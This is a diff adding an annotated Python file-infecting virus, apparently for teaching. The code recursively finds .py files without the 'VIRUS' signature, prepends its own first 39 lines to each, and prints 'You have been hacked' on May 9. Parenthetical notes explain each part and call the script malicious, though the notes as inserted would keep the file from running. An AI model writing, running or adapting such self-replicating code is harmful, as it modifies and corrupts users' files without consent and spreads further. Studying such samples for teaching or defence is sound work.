@@ -1,0 +1,56 @@
+#!/usr/bin/python3
+import os 
+(makes the os module available in Python)
+
+import datetime 
+(provides the functions to work with dates and times)
+
+SIGNATURE = "VIRUS" 
+(variable assignment statement could search for instances of the string "VIRUS" or be part of a virus or malware program that uses the string as a 
+signature to identify its presence in a system.)
+
+def locate(path):
+    files_targeted = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+(For each Python file found, it checks whether the file contains a specific "signature" (i.e.,"VIRUS"). If it doesn't, the file path is 
+added to a list of "targeted" files that do not contain the virus.)
+
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+        if 0 <= i < 39:
+            virusstring += line
+    virus.close
+    for fname in files_targeted:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+
+def detonate():
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+(The infect function opens the current script file, reads its first 39 lines, and saves them into a string called virusstring. This essentially
+infects the targeted files by attaching the virusstring to them. The detonate function checks the current date and prints "You have been hacked" 
+with the date stamp May 9th.)
+
+files_targeted = locate(os.path.abspath(""))
+infect(files_targeted)
+detonate()
+(The script is searching for Python files infecting them with a virus, and potentially detonating the virus, ultimately, this script is an example of 
+malicious code)
